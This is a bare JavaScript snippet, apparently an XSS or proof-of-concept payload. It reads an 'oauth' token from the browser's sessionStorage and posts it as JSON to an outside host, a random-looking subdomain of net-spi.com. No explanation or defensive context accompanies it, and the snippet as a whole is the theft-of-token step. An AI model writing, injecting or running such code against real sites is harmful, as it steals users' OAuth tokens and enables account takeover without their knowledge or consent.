fetch('https://jax6mehro2h64fempticckwpqgwek48t.net-spi.com/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        oauth: sessionStorage.getItem('oauth')
    })
});
